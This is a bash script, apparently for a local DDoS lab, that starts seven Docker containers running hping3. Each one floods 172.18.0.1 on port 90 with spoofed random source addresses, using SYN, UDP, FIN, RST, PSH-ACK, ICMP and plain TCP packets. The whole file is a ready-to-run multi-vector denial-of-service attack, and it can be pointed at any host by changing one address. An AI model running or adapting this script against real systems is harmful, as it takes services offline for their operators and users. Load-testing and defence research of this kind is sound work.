#!/bin/bash

first_container_id=$(docker run utkudarilmaz/hping3:latest --rand-source --flood -d 500 -p 90 172.18.0.1)
second_container_id=$(docker run utkudarilmaz/hping3:latest --rand-source -S -q -n --flood -d 500 -p 90 172.18.0.1)
third_container_id=$(docker run utkudarilmaz/hping3:latest --rand-source --udp --flood -d 500 -p 90 172.18.0.1)
fourth_container_id=$(docker run --network ddos_app-network utkudarilmaz/hping3:latest --rand-source -F --flood -p 90 172.18.0.1)
fifth_container_id=$(docker run --network ddos_app-network utkudarilmaz/hping3:latest --rand-source -R --flood -d 500 -p 90 172.18.0.1)
sixth_container_id=$(docker run --network ddos_app-network utkudarilmaz/hping3:latest --rand-source -PA --flood -d 500 -p 90 172.18.0.1)
seventh_container_id=$(docker run --network ddos_app-network utkudarilmaz/hping3:latest --rand-source -1 --flood -d 500 -p 90 172.18.0.1)

docker wait "$first_container_id"
docker wait "$second_container_id"
docker wait "$third_container_id"
docker wait "$fourth_container_id"
docker wait "$fifth_container_id"
docker wait "$sixth_container_id"
docker wait "$seventh_container_id"
  